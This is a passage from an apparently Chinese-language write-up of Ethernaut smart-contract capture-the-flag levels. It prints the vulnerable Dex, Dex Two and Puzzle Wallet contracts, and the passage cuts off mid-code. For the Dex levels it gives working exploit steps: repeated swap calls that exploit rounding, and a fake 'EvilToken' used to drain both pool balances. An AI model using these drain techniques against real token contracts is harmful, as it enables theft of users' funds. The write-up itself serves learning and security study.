punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>也就是说当兑换 token y 的时候，amount* token y 的余额 /token x 的余额，而 solidity 的计算是向下取整的。</p><p>Attack<br>最开始我们是 10a 和 10b，dex 则是 100a 和 100b，所以第一次计算就变成了 0a 和 20b，dex 变成 110a 和 90b。第二次兑换就变成了 20*110b/90a=24a<br>所以依次计算。</p><p>token1	token2<br>initialize	pool	100	100<br>player	10	10<br>token1-&gt; token2: 10	pool	110	90<br>player	0	24<br>token2-&gt;token1: 20	pool	86	110<br>player	24	0<br>token1-&gt;token2: 24	pool	110	80<br>player	0	30<br>token2-&gt; token1: 30	pool	69	110<br>player	41	0<br>token1-&gt;token2: 41	pool	110	45<br>player	0	65<br>token2-&gt;token1: 45	pool	110	90<br>player	45	110<br>// 授权合约转账 player 的两个 token<br>await contract.approve(instance,10000)<br>// 设置两个 token 变量<br>const token1 = await contract.token1 ()<br>const token2 = await contract.token2()<br>// 执行来回 swap 方法<br>await contract.swap (token1,token2,10)<br>await contract.swap(token2,token1,20)<br>await contract.swap(token1,token2,24)<br>await contract.swap(token2,token1,30)<br>await contract.swap(token1,token2,41)<br>await contract.swap(token2,token1,45)</p><p>// 检查合约中 token2 的数量<br>(await contract.balanceOf (token1,instance)).toString () =&gt; 0</p><h2 id="dex-two"><a class="anchor" href="#dex-two">#</a> Dex Two</h2><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-08/token/ERC20/IERC20.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-08/token/ERC20/ERC20.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-08/access/Ownable.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">DexTwo</span> <span class="token keyword">is</span> Ownable <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> token1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> token2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">setTokens</span><span class="token punctuation">(</span><span class="token builtin">address</span> _token1<span class="token punctuation">,</span> <span class="token builtin">address</span> _token2<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        token1 <span class="token operator">=</span> _token1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        token2 <span class="token operator">=</span> _token2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">add_liquidity</span><span class="token punctuation">(</span><span class="token builtin">address</span> token_address<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token function">IERC20</span><span class="token punctuation">(</span>token_address<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">>=</span> amount<span class="token punctuation">,</span> <span class="token string">"Not enough to swap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token builtin">uint256</span> swapAmount <span class="token operator">=</span> <span class="token function">getSwapAmount</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">getSwapAmount</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>amount <span class="token operator">*</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token function">SwappableTokenTwo</span><span class="token punctuation">(</span>token1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token function">SwappableTokenTwo</span><span class="token punctuation">(</span>token2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token keyword">return</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">SwappableTokenTwo</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">private</span> _dex<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> dexInstance<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> name<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> symbol<span class="token punctuation">,</span> <span class="token builtin">uint256</span> initialSupply<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token function">ERC20</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> symbol<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token function">_mint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> initialSupply<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>        _dex <span class="token operator">=</span> dexInstance<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="54"></td><td><pre></pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> owner<span class="token punctuation">,</span> <span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>owner <span class="token operator">!=</span> _dex<span class="token punctuation">,</span> <span class="token string">"InvalidApprover"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>        super<span class="token punctuation">.</span><span class="token function">_approve</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>题目要求将合约里的两个 token 数量全部取出，允许自己发行自定义 token</p><p>Analyse<br>本官 swap 函数没有</p><p>require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), “Invalid tokens”);</p><p>这句话做检查，说明攻击者允许出售任意一个 from 代币从 Dex 中获得真正的 to 代币，可以新的代币合约</p><p>那么我们只需要发送一个 faketoken 到 dex 合约，我们就可以交换 100 个 faketoken 来换回 token1，然后重复操作换回 token2 即可</p><p>token1	token2	token3<br>initialize	pool	100	100	1<br>player	10	10	3<br>token3-&gt;token1: 1	pool	0	100	2<br>player	100	10	2<br>token3-&gt;token2: 2	pool	0	0	4<br>player	100	100	0<br>主要是利用价格计算公式</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">getSwapAmount</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token punctuation">(</span>amount <span class="token operator">*</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>Attack</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.20</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/token/ERC20/ERC20.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">EvilToken</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> initialSupply<span class="token punctuation">)</span> <span class="token function">ERC20</span><span class="token punctuation">(</span><span class="token string">"EvilToken"</span><span class="token punctuation">,</span> <span class="token string">"EVL"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token function">_mint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> initialSupply<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>然后对目标合约进行授权以及转账</p><p>// 注意：在转账后要刷新页面，要不然页面反应不过来<br>// 定义 token 变量<br>const token1 = await contract.token1 ()<br>const token2 = await contract.token2()<br>const token3 = &quot;0xe112b308b78cafc6aee31de26f5331b7a414ec14&quot;// 部署合约的地址</p><p>// 分别调用 swap 方法<br>await contract.swap (token3,token1,1) // 调用完以后池子里 token3 的数量为 2，所以下次调用需要用两个 token2 来兑换 token2<br>await contract.swap(token3,token2,2)</p><p>// 分别查看执行完池子中 token1 和 token2 的数量<br>(await contract.balanceOf (token1,instance)).toString () =&gt; 0<br>(await contract.balanceOf(token2,instance)).toString() =&gt; 0<br>Puzzle Wallet</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">pragma</span> experimental ABIEncoderV2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> <span class="token string">"../helpers/UpgradeableProxy-08.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">PuzzleProxy</span> <span class="token keyword">is</span> UpgradeableProxy <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> pendingAdmin<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> admin<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _admin<span class="token punctuation">,</span> <span class="token builtin">address</span> _implementation<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">memory</span> _initData<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token function">UpgradeableProxy</span><span class="token punctuation">(</span>_implementation<span class="token punctuation">,</span> _initData<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        admin <span class="token operator">=</span> _admin<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">modifier</span> <span class="token function">onlyAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> admin<span class="token punctuation">,</span> <span class="token string">"Caller is not the admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">_</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">proposeNewAdmin</span><span class="token punctuation">(</span><span class="token builtin">address</span> _newAdmin<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        pendingAdmin <span class="token operator">=</span> _newAdmin<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">approveNewAdmin</span><span class="token punctuation">(</span><span class="token builtin">address</span> _expectedAdmin<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyAdmin <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>pendingAdmin <span class="token operator">==</span> _expectedAdmin<span class="token punctuation">,</span> <span class="token string">"Expected new admin by the current admin is not the pending admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        admin <span class="token operator">=</span> pendingAdmin<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">upgradeTo</span><span class="token punctuation">(</span><span class="token builtin">address</span> _newImplementation<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyAdmin <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token function">_upgradeTo</span><span class="token punctuation">(</span>_newImplementation<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">PuzzleWallet</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> maxBalance<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token keyword">public</span> whitelisted<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _maxBalance<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>maxBalance <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Already initialized"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        maxBalance <span class="token operator">=</span> _maxBalance<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">modifier</span> <span class="token function">onlyWhitelisted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>whitelisted<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"Not whitelisted"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token keyword">_</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="52"></td><td><pre></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">setMaxBalance</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _maxBalance<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyWhitelisted <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Contract balance is not 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>        maxBalance <span class="token operator">=</span> _maxBalance<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="57"></td><td><pre></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">addToWhitelist</span><span class="token punctuation">(</span><span class="token builtin">address</span> addr<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span> <span class="token string">"Not the owner"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>        whitelisted<span class="token punctuation">[</span>addr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="62"></td><td><pre></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> onlyWhitelisted <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">&lt;=</span> maxBalance<span class="token punctuation">,</span> <span class="token string">"Max balance reached"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> value<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">calldata</span> data<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> onlyWhitelisted <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> value<span class="token punctuation">,</span> <span class="token string">"Insufficient balance"</span><span class="token punctuation">)</span><span class="token 